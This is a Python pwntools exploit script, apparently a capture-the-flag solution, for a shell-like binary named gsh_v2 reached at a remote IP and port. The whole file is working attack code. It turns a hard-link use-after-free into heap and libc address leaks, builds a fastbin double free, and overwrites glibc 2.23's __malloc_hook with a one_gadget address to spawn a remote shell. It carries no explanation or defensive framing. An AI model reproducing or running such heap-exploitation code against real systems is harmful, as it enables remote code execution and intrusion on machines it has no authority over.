from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
#r = process('./gsh_v2')
r = remote('106.10.34.139', 20005)

# Make Dummy
r.sendlineafter('$ ', 'touch dummy1')
r.sendlineafter('$ ', 'touch dummy2')
r.sendlineafter('$ ', 'touch dummy3')

# Make Link
r.sendlineafter('$ ', 'ln dummy2 vuln')

# Trigger Vuln
r.sendlineafter('$ ', 'rm dummy3')
r.sendlineafter('$ ', 'rm dummy2')

# Change Name Ptr
r.sendlineafter('$ ', 'gvim vuln')
r.sendlineafter('length? ', str(0x1f))
r.sendafter('content: ', '\x90')

# Leak Heap Addr
r.sendlineafter('$ ', 'gvim vuln')
r.recvuntil('/guardian/')
heap_base = u64(r.recvline()[:-1].ljust(8, '\x00')) - 0x2c0
log.info('HEAP BASE: 0x{:016x}'.format(heap_base))
r.sendlineafter('length? ', str(0x1f))
r.sendafter('content: ', '\x90')

# Make Unsorted Bin && Leak Libc Addr
r.sendlineafter('$ ', 'touch '+'a'*0x100)
r.sendlineafter('$ ', 'rm '+'a'*0x100)
r.sendlineafter('$ ', 'gvim vuln')
r.sendlineafter('length? ', str(0x1f))
r.sendafter('content: ', p64(heap_base+0x7b0))
r.sendlineafter('$ ', 'gvim vuln')
r.recvuntil('/guardian/')
libc.address = u64(r.recvline()[:-1].ljust(8, '\x00')) - 0x3c4b78

malloc_hook = libc.symbols['__malloc_hook']
log.info('LIBC BASE: 0x{:016x}'.format(libc.address))

r.sendlineafter('length? ', str(0x1f))
r.sendafter('content: ', '\x90')
r.sendlineafter('$ ', 'gvim vuln')
r.sendlineafter('length? ', str(0x1f))
r.sendafter('content: ', p64(heap_base))

# Make fastbins with size 0x70
r.sendlineafter('$ ', 'touch 1')
r.sendlineafter('$ ', 'touch 2')
r.sendlineafter('$ ', 'gvim 1')
r.sendlineafter('length? ', str(0x5f))
r.sendafter('content: ', 'a')
r.sendlineafter('$ ', 'gvim 2')
r.sendlineafter('length? ', str(0x5f))
r.sendafter('content: ', 'a')

r.sendlineafter('$ ', 'gvim 1')
r.sendlineafter('length? ', str(0x1f))
r.sendafter('content: ', 'a')
r.sendlineafter('$ ', 'gvim 2')
r.sendlineafter('length? ', str(0x1f))
r.sendafter('content: ', 'a')

# Change Pointer Addr && Trigger Double Free
r.sendlineafter('$ ', 'gvim vuln')
r.sendlineafter('length? ', str(0x1f))
r.sendafter('content: ', '\x90')
r.sendlineafter('$ ', 'gvim vuln')
r.sendlineafter('length? ', str(0x1f))
r.sendafter('content: ', p64(heap_base)+p64(heap_base+0xa40))

# Get Chunk with Addr __malloc_hook && Write Pointer of One_gadget
r.sendlineafter('$ ', 'gvim 1')
r.sendlineafter('length? ', str(0x5f))
r.sendafter('content: ', p64(malloc_hook-0x1b-8))

r.sendlineafter('$ ', 'touch '+'c'*0x60)
r.sendlineafter('$ ', 'gvim 2')
r.sendlineafter('length? ', str(0x5f))
system = libc.address + 0xf1147
r.sendafter('content: ', 'a'*(0x1b-8)+p64(system))

# Trigger __malloc_hook and Get Shell
r.sendafter('$ ', '\x00'*0x200)

r.interactive()
